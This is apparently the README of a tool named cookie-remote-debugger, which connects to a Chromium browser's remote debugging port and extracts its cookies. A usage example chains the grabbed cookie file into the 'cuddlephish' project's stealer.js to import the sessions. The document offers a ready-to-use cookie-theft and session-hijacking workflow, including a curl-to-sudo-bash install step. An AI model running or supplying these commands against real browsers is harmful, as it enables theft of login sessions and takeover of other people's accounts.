# cookie-remote-debugger
python script for connecting to chromium remote debugging port and grabbing cookies

```
python3 grab-cookies.py -h
usage: grab-cookies.py [-h] -p PORT

Grab cookies from a remote debugger

options:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  The Port of the remote debugger
```

Example
```
# Grab cookies
python3 grab-cookies.py -p 9222 

# Clone Project
cd 
git clone https://github.com/fkasler/cuddlephish
cd cuddlephish

# Install Dependencies Example on Debian 
curl -fsSL https://deb.nodesource.com/setup_23.x -o nodesource_setup.sh
sudo -E bash nodesource_setup.sh
sudo apt-get install nodejs
npm install

# Import Cookies
cp ~/cookie-remote-debugger/cuddlephish_YYYY-MM-DD_HH-MM-SS.json .
node stealer.js cuddlephish_YYYY-MM-DD_HH-MM-SS.json
```